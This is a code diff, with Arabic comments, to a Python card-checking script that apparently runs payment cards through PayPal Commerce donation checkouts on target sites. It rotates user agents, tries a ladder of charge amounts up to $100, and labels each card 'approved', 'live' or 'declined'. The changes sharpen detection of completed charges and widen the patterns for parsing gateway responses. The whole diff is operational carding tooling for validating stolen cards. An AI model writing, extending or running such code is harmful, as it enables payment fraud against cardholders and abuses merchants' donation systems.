@@ -106,7 +106,7 @@ async def get_bin_info(bin_number):
         await asyncio.sleep(0.5)
     return "Unknown", "Unknown", "Unknown"
 
-# ===================== PAYPAL COMMERCE CLASS (FINAL V2) =====================
+# ===================== PAYPAL COMMERCE CLASS (FINAL V3) =====================
 
 class PayPalCommerce:
     def __init__(self, target_url):
@@ -405,7 +405,7 @@ class PayPalCommerce:
         amounts_to_try = []
         if self.minimum_amount and self.minimum_amount != "1.00":
             amounts_to_try.append(self.minimum_amount)
-        amounts_to_try.extend(["5.00", "10.00", "18.50", "25.00", "36.50", "50.00"])
+        amounts_to_try.extend(["5.00", "10.00", "18.50", "25.00", "36.50", "50.00", "100.00"])
         
         headers = {
             'user-agent': self.get_next_ua(),
@@ -531,7 +531,7 @@ class PayPalCommerce:
         amounts_to_try = []
         if self.minimum_amount and self.minimum_amount != "1.00":
             amounts_to_try.append(self.minimum_amount)
-        amounts_to_try.extend(["5.00", "10.00", "18.50", "25.00", "36.50", "50.00"])
+        amounts_to_try.extend(["5.00", "10.00", "18.50", "25.00", "36.50", "50.00", "100.00"])
         
         headers = {
             'user-agent': self.get_next_ua(),
@@ -563,22 +563,20 @@ class PayPalCommerce:
     def _is_name_response(self, text):
         """التحقق إذا كان النص مجرد اسم شخص"""
         text_strip = text.strip()
+        text_lower = text_strip.lower()
         
-        # لو النص اسم واحد
         if text_strip in self.first_name or text_strip in self.last_name:
             return True
         
-        # لو النص اسمين (first + last)
         for fn in self.first_name:
             for ln in self.last_name:
                 if text_strip == f"{fn} {ln}":
                     return True
         
-        # لو النص فيه اسم بس ومفيش أي كلمات PayPal
-        paypal_keywords = ['error', 'declined', 'insufficient', 'approved', 'charge', 'true', 'invalid', 'amount', 'order', 'payer', 'card', 'payment', 'issue', 'name', 'message', 'details', 'description', 'minimum', 'donation', 'address', 'city', 'state', 'zip', 'phone', 'title', 'prefix']
+        paypal_keywords = ['error', 'declined', 'insufficient', 'approved', 'charge', 'true', 'invalid', 'amount', 'order', 'payer', 'card', 'payment', 'issue', 'name', 'message', 'details', 'description', 'minimum', 'donation', 'address', 'city', 'state', 'zip', 'phone', 'title', 'prefix', 'create', 'failed', 'action', 'required', 'cannot', 'pay']
         
         if len(text_strip) < 100:
-            has_keyword = any(k in text_strip.lower() for k in paypal_keywords)
+            has_keyword = any(k in text_lower for k in paypal_keywords)
             if not has_keyword:
                 return True
         
@@ -713,19 +711,47 @@ class PayPalCommerce:
                 text_lower = text.lower()
                 text_strip = text.strip()
                 
-                # CHARGE حقيقي
-                if 'true' in text_lower:
+                # ===== CHARGE حقيقي فقط =====
+                # لو النص حرفياً "true" (من givewp approve)
+                if text_strip.lower() == 'true':
                     return 'CHARGE 1.0'
                 
-                # ORDER_NOT_APPROVED
+                # لو في capture status COMPLETED
+                try:
+                    approve_json = approve_res.json()
+                    if isinstance(approve_json, dict):
+                        if 'status' in approve_json:
+                            status_val = str(approve_json['status']).upper()
+                            if status_val == 'COMPLETED':
+                                return 'CHARGE 1.0'
+                        
+                        if 'purchase_units' in approve_json:
+                            for unit in approve_json['purchase_units']:
+                                if 'payments' in unit:
+                                    payments = unit['payments']
+                                    if 'captures' in payments:
+                                        for capture in payments['captures']:
+                                            if capture.get('status', '').upper() == 'COMPLETED':
+                                                return 'CHARGE 1.0'
+                        
+                        if 'data' in approve_json:
+                            if isinstance(approve_json['data'], dict):
+                                if 'status' in approve_json['data']:
+                                    status_val = str(approve_json['data']['status']).upper()
+                                    if status_val == 'COMPLETED':
+                                        return 'CHARGE 1.0'
+                except:
+                    pass
+                
+                # ===== ORDER_NOT_APPROVED =====
                 if 'order_not_approved' in text_lower:
                     return "Payer cannot pay for this transaction."
                 
-                # التحقق من الاسم (حل مشكلة Michael Williams)
+                # ===== Michael Williams =====
                 if self._is_name_response(text):
                     return "PAYER_ACTION_REQUIRED"
                 
-                # استخراج الرد الفعلي
+                # ===== استخراج الرد الفعلي =====
                 try:
                     approve_json = approve_res.json()
                     if isinstance(approve_json, dict):
@@ -754,12 +780,15 @@ class PayPalCommerce:
                     if issue == 'ORDER_NOT_APPROVED':
                         return "Payer cannot pay for this transaction."
                     return issue
+                
                 name_matches = re.findall(r'"name"\s*:\s*"([^"]+)"', text)
                 if name_matches:
                     return name_matches[0]
+                
                 error_matches = re.findall(r'"error"\s*:\s*"([^"]+)"', text)
                 if error_matches:
                     return error_matches[0]
+                
                 if len(text) < 200:
                     return text
             
@@ -780,10 +809,15 @@ async def check_card_api(card_full, gateway_url):
             result = str(result_raw)
             result_lower = result.lower()
             
-            if "true" in result_lower or "charge 1" in result_lower or "charge $" in result_lower or "charged" in result_lower:
+            # ===== CHARGE حقيقي فقط =====
+            if result.startswith("CHARGE"):
                 return "approved", result_raw
+            
+            # ===== LIVE =====
             elif "insufficient" in result_lower:
                 return "live", result_raw
+            
+            # ===== DECLINED =====
             else:
                 if result.startswith("Error:"):
                     result = result.replace("Error:", "").strip()
@@ -791,6 +825,7 @@ async def check_card_api(card_full, gateway_url):
                     return "declined", result
                 else:
                     return "declined", "Declined"
+                    
         except Exception as e:
             return "declined", f"Error: {e}"
 
